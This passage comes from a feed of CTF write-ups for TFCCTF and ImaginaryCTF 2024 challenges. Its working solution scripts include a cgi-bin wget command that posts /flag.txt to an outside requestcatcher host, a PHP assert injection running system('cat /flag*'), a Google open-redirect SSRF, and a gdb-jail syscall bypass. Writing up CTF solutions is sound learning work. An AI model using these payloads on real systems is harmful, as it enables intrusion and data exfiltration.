    <span class="k">with</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span> <span class="k">as</span> <span class="n">ses</span><span class="p">:</span>
        <span class="n">ses</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">REMOTE</span> <span class="o">+</span> <span class="s">'login'</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s">'Content-Type'</span><span class="p">:</span><span class="s">'application/x-www-form-urlencoded'</span><span class="p">},</span> <span class="n">data</span><span class="o">=</span><span class="n">login</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="p">{</span>
            <span class="s">'http'</span><span class="p">:</span> <span class="s">'http://0.0.0.0:8080'</span><span class="p">,</span>
            <span class="s">'https'</span><span class="p">:</span> <span class="s">'https://0.0.0.0:8080'</span>
        <span class="p">})</span>
        <span class="n">res</span> <span class="o">=</span> <span class="n">ses</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">REMOTE</span> <span class="o">+</span> <span class="s">'a.html'</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="p">{</span>
            <span class="s">'http'</span><span class="p">:</span> <span class="s">'http://0.0.0.0:8080'</span><span class="p">,</span>
            <span class="s">'https'</span><span class="p">:</span> <span class="s">'https://0.0.0.0:8080'</span>
        <span class="p">})</span>
        <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"DEBUGPRINT[4]: go.py:37: res.text=</span><span class="si">{</span><span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>

<span class="n">create_file</span><span class="p">()</span>
<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="n">crash</span><span class="p">()</span>
<span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
<span class="n">get</span><span class="p">()</span>
</code></pre></div></div>

<h2 id="flag">Flag</h2>
<p><code class="language-plaintext highlighter-rouge">TFCCTF{Cr4Sh_g0_bRbRbRbRbR}</code></p>

<p>shafouz 2024/08/03</p>]]></content><author><name>shafouz</name><email>jlmacedomatos@gmail.com</email></author><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">funny - TFCCTF 2024</title><link href="https://shafouz.github.io/2024/08/03/funny.html" rel="alternate" type="text/html" title="funny - TFCCTF 2024" /><published>2024-08-03T04:00:00+00:00</published><updated>2024-08-03T04:00:00+00:00</updated><id>https://shafouz.github.io/2024/08/03/funny</id><content type="html" xml:base="https://shafouz.github.io/2024/08/03/funny.html"><![CDATA[<p>https://ctftime.org/event/2423</p>

<h1 id="funny-web">funny (web)</h1>

<p>cgi-bin stuff</p>

<h2 id="solution">Solution</h2>

<div class="language-conf highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ScriptAlias</span> /<span class="n">cgi</span>-<span class="n">bin</span> /<span class="n">usr</span>/<span class="n">bin</span>
</code></pre></div></div>
<p>Allows us to execute any binary on the dir with http path.
It took some trial and error to get it working, i wonder if you can solve it with awk</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">quote</span><span class="p">,</span> <span class="n">quote_plus</span>

<span class="n">REMOTE</span> <span class="o">=</span> <span class="s">"http://challs.tfcctf.com:31311/"</span>

<span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"wget?--post-file+/flag.txt+https://lalalalalallalala.requestcatcher.com/"</span>
<span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">REMOTE</span> <span class="o">+</span> <span class="sa">f</span><span class="s">"cgi-bin/</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s">"</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="p">{</span>
    <span class="s">'http'</span><span class="p">:</span> <span class="s">'http://0.0.0.0:8080'</span><span class="p">,</span>
    <span class="s">'https'</span><span class="p">:</span> <span class="s">'https://0.0.0.0:8080'</span>
<span class="p">})</span>
<span class="k">print</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="flag">Flag</h2>
<p><code class="language-plaintext highlighter-rouge">TFCCTF{1_4lm0st_f0rg0t_t0_push_th1s_fl4g_t0_th3_c0nt4in3r}</code></p>

<p>shafouz 2024/08/03</p>]]></content><author><name>shafouz</name><email>jlmacedomatos@gmail.com</email></author><summary type="html"><![CDATA[https://ctftime.org/event/2423]]></summary></entry><entry><title type="html">surfing - TFCCTF 2024</title><link href="https://shafouz.github.io/2024/08/03/surfing.html" rel="alternate" type="text/html" title="surfing - TFCCTF 2024" /><published>2024-08-03T04:00:00+00:00</published><updated>2024-08-03T04:00:00+00:00</updated><id>https://shafouz.github.io/2024/08/03/surfing</id><content type="html" xml:base="https://shafouz.github.io/2024/08/03/surfing.html"><![CDATA[<p>https://ctftime.org/event/2423</p>

<h1 id="surfing-web">surfing (web)</h1>

<p>Google redirects</p>

<h2 id="solution">Solution</h2>

<p>Very interesting challenge, basically you send an email on gmail to yourself to get the usg parameter.
Then you can use google as a open-redirect.
<code class="language-plaintext highlighter-rouge">#</code> at the end is needed for some reason.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">quote_plus</span><span class="p">,</span> <span class="n">quote</span>

<span class="n">part2</span> <span class="o">=</span> <span class="s">"https://ca14-2804-1b3-8146-8451-d3ef-cb85-2b79-23d7.ngrok-free.app&amp;source=gmail&amp;ust=1722697936722000&amp;usg=AOvVaw3Djb1BbeFhNoc5_At0Cbfe#"</span>
<span class="n">part2</span> <span class="o">=</span> <span class="n">quote_plus</span><span class="p">(</span><span class="n">part2</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">=</span> <span class="s">"http://google.com/url?q="</span> <span class="o">+</span> <span class="n">part2</span>

<span class="n">burp0_url</span> <span class="o">=</span> <span class="s">"http://challs.tfcctf.com:31595/get"</span>

<span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">burp0_url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="sa">f</span><span class="s">'url=</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s">'</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="p">{</span>
    <span class="s">'http'</span><span class="p">:</span> <span class="s">'http://0.0.0.0:8080'</span><span class="p">,</span>
    <span class="s">'https'</span><span class="p">:</span> <span class="s">'https://0.0.0.0:8080'</span>
<span class="p">})</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"DEBUGPRINT[1]: go.py:6: res.text=</span><span class="si">{</span><span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>


</code></pre></div></div>

<h2 id="flag">Flag</h2>
<p><code class="language-plaintext highlighter-rouge">TFCCTF{18fd102247cb73e9f9acaa42801ad03cf622ca1c3689e4969affcb128769d0bc}</code></p>

<p>shafouz 2024/08/03</p>]]></content><author><name>shafouz</name><email>jlmacedomatos@gmail.com</email></author><summary type="html"><![CDATA[https://ctftime.org/event/2423]]></summary></entry><entry><title type="html">gdbjail2 - ImaginaryCTF 2024</title><link href="https://shafouz.github.io/2024/07/21/gdbjail2.html" rel="alternate" type="text/html" title="gdbjail2 - ImaginaryCTF 2024" /><published>2024-07-21T04:00:00+00:00</published><updated>2024-07-21T04:00:00+00:00</updated><id>https://shafouz.github.io/2024/07/21/gdbjail2</id><content type="html" xml:base="https://shafouz.github.io/2024/07/21/gdbjail2.html"><![CDATA[<p>https://ctftime.org/event/2396</p>

<h1 id="gdbjail2-misc">gdbjail2 (misc)</h1>

<p>this time with a blocklist</p>

<h2 id="solution">Solution</h2>

<p>The main difference in this one is the blacklist:</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">blacklist</span> <span class="o">=</span> <span class="p">[</span><span class="s">"p"</span><span class="p">,</span> <span class="s">"-"</span><span class="p">,</span> <span class="s">"&amp;"</span><span class="p">,</span> <span class="s">"("</span><span class="p">,</span> <span class="s">")"</span><span class="p">,</span> <span class="s">"["</span><span class="p">,</span> <span class="s">"]"</span><span class="p">,</span> <span class="s">"{"</span><span class="p">,</span> <span class="s">"}"</span><span class="p">,</span> <span class="s">"0x"</span><span class="p">]</span>
</code></pre></div></div>
<p>So we can’t just set $rip.</p>

<p>We are debugging cat without any arguments, so it just hangs there forever waiting for input.
It takes input using the read syscall.
We can just add a breakpoint before read, change the registers and continue.
Allowing us to call any syscall that we want.</p>

<p>The way to find where the syscall is might be a little bit harder, I just
installed pwndbg on the Docker image, and used <code class="language-plaintext highlighter-rouge">stepuntilasm syscall</code>.
But you can also step to it or use a custom gdb script.</p>

<p>You can probably just call execve and be done with it.
I unfortunately chose a harder path.</p>

<ol>
  <li>open flag dir</li>
  <li>call opendents</li>
  <li>read flag filename</li>
  <li>open flag</li>
  <li>read flag</li>
  <li>print flag from mem</li>
</ol>

<p>Its pretty straight forward, there are two problems though.</p>

<p>First, The flag filename has the letter ‘p’ in it which is on the blacklist.
We can bypass that by using integers instead of chars, see the <code class="language-plaintext highlighter-rouge">alloc_str</code> function.</p>

<p>And second, finding writeable memory
We can just do <code class="language-plaintext highlighter-rouge">set $rax = "AAAA"</code>.
This gives us a heap string of any size we want.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="k">def</span> <span class="nf">sendfile</span><span class="p">(</span><span class="n">fd1</span><span class="p">,</span> <span class="n">fd2</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"set $rax = 40"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set $rdi = </span><span class="si">{</span><span class="n">fd1</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set $rsi = </span><span class="si">{</span><span class="n">fd2</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set $rdx = 0"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set $r10 = 64"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"continue"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">dump</span><span class="p">(</span><span class="n">offset</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"set $rax = 1"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"set $rdi = 1"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set $rsi = </span><span class="se">\"</span><span class="si">{</span><span class="s">'B'</span><span class="si">}</span><span class="se">\"</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set $r14 = 65535 * </span><span class="si">{</span><span class="n">offset</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"set $si = $si + $r14"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set $rdx = 256"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"continue"</span><span class="p">)</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recv</span><span class="p">()</span>
    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"DEBUGPRINT[3]: clean.py:16: p.recv()=</span><span class="si">{</span><span class="n">data</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">data</span> 

<span class="k">def</span> <span class="nf">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"set $rax = 1"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set $rdi = </span><span class="si">{</span><span class="n">fd</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set $rsi = </span><span class="se">\"</span><span class="si">{</span><span class="n">data</span><span class="si">}</span><span class="se">\"</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set $rdx = </span><span class="si">{</span><span class="n">n</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"continue"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">_open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">mode</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"set $rax = 2"</span><span class="p">)</span>
    <span class="n">alloc_str</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">"$rdi"</span><span class="p">)</span>
    <span class="c1"># p.sendlineafter(b"(gdb) ", f"set $rdi = \"{filename}\"".encode())
</span>    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set $rsi = </span><span class="si">{</span><span class="n">mode</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set $rdx = 0"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"continue"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">getdents</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"set $rax = 78"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set $rdi = </span><span class="si">{</span><span class="n">fd</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set $rsi = </span><span class="se">\"</span><span class="si">{</span><span class="s">'A'</span> <span class="o">*</span> <span class="mi">256</span><span class="si">}</span><span class="se">\"</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set $rdx = </span><span class="si">{</span><span class="n">n</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"continue"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"set $rax = 0"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set $rdi = </span><span class="si">{</span><span class="n">fd</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set $rsi = </span><span class="se">\"</span><span class="si">{</span><span class="s">'A'</span><span class="o">*</span><span class="n">n</span><span class="si">}</span><span class="se">\"</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set $rdx = </span><span class="si">{</span><span class="n">n</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"continue"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">alloc_str</span><span class="p">(</span><span class="n">string</span><span class="p">,</span> <span class="n">reg</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set </span><span class="si">{</span><span class="n">reg</span><span class="si">}</span><span class="s"> = </span><span class="se">\"</span><span class="si">{</span><span class="s">'A'</span><span class="o">*</span><span class="nb">len</span><span class="p">(</span><span class="n">string</span><span class="p">)</span><span class="si">}</span><span class="se">\"</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set $start = </span><span class="si">{</span><span class="n">reg</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>

    <span class="k">for</span> <span class="n">chunk</span> <span class="ow">in</span> <span class="n">string</span><span class="p">:</span>
        <span class="n">chunk</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span>
        <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set *</span><span class="si">{</span><span class="n">reg</span><span class="si">}</span><span class="s"> = </span><span class="si">{</span><span class="n">chunk</span><span class="si">}</span><span class="s">"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
        <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set </span><span class="si">{</span><span class="n">reg</span><span class="si">}</span><span class="s"> = </span><span class="si">{</span><span class="n">reg</span><span class="si">}</span><span class="s"> + 1"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>

    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set *</span><span class="si">{</span><span class="n">reg</span><span class="si">}</span><span class="s"> = 0"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">f</span><span class="s">"set </span><span class="si">{</span><span class="n">reg</span><span class="si">}</span><span class="s"> = $start"</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>

<span class="k">with</span> <span class="n">remote</span><span class="p">(</span><span class="s">"gdbjail2.chal.imaginaryctf.org"</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span> <span class="k">as</span> <span class="n">p</span><span class="p">:</span>
    <span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">":25</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>

    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"break *write+21"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"break *write+23"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"continue"</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s">""</span><span class="p">)</span>

    <span class="n">_open</span><span class="p">(</span><span class="s">"."</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"continue"</span><span class="p">)</span>

    <span class="n">getdents</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">256</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"continue"</span><span class="p">)</span>
    
    <span class="n">data</span> <span class="o">=</span> <span class="n">dump</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
    <span class="n">idx</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="sa">b</span><span class="s">'.txt'</span><span class="p">)</span>
    <span class="n">flag</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="n">idx</span><span class="o">-</span><span class="mi">20</span><span class="p">:</span><span class="n">idx</span><span class="o">+</span><span class="mi">4</span><span class="p">]</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"continue"</span><span class="p">)</span>

    <span class="n">_open</span><span class="p">(</span><span class="n">flag</span><span class="p">.</span><span class="n">decode</span><span class="p">(),</span> <span class="mi">0</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"continue"</span><span class="p">)</span>
    
    <span class="n">read</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">64</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"continue"</span><span class="p">)</span>
    
    <span class="n">dump</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"(gdb) "</span><span class="p">,</span> <span class="sa">b</span><span class="s">"continue"</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="flag">Flag</h2>
<p><code class="language-plaintext highlighter-rouge">ictf{i_l0ve_syscalls_eebc5336}</code></p>

<p>shafouz 2024/07/21</p>]]></content><author><name>shafouz</name><email>jlmacedomatos@gmail.com</email></author><summary type="html"><![CDATA[https://ctftime.org/event/2396]]></summary></entry><entry><title type="html">journal - ImaginaryCTF 2024</title><link href="https://shafouz.github.io/2024/07/21/journal.html" rel="alternate" type="text/html" title="journal - ImaginaryCTF 2024" /><published>2024-07-21T04:00:00+00:00</published><updated>2024-07-21T04:00:00+00:00</updated><id>https://shafouz.github.io/2024/07/21/journal</id><content type="html" xml:base="https://shafouz.github.io/2024/07/21/journal.html"><![CDATA[<p>https://ctftime.org/event/2396</p>

<h1 id="journal-web">journal (web)</h1>

<p>one file php challenge</p>

<h2 id="solution">Solution</h2>

<p>At first i thought there was some include path stuff.
But after trying every byte there were some interesting messages about assert.
And its apparently well known:
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s">"file1.txt' and die(system(</span><span class="se">\"</span><span class="s">cat /flag*</span><span class="se">\"</span><span class="s">)) or '"</span>
<span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"http://journal.chal.imaginaryctf.org/"</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s">"file"</span><span class="p">:</span><span class="n">payload</span><span class="p">})</span>
<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"DEBUGPRINT[1]: go.py:14: res.text=</span><span class="si">{</span><span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="flag">Flag</h2>
<p><code class="language-plaintext highlighter-rouge">ictf{assertion_failed_e3106922feb13b10}</code></p>

<p>shafouz 2024/07/21</p>]]></content><author><name>shafouz</name><email>jlmacedomatos@gmail.com</email></author><summary type="html"><![CDATA[https://ctftime.org/event/2396]]></summary></entry><entry><title type="html">ok nice - ImaginaryCTF 2024</title><link href="https://shafouz.github.io/2024/07/21/ok-nice.html" rel="alternate" type="text/html" title="ok nice - ImaginaryCTF 2024" /><published>2024-07-21T04:00:00+00:00</published><updated>2024-07-21T04:00:00+00:00</updated><id>https://shafouz.github.io/2024/07/21/ok-nice</id><content type="html" xml:base="https://shafouz.github.io/2024/07/21/ok-nice.html"><![CDATA[<p>https://ctftime.org/event/2396</p>

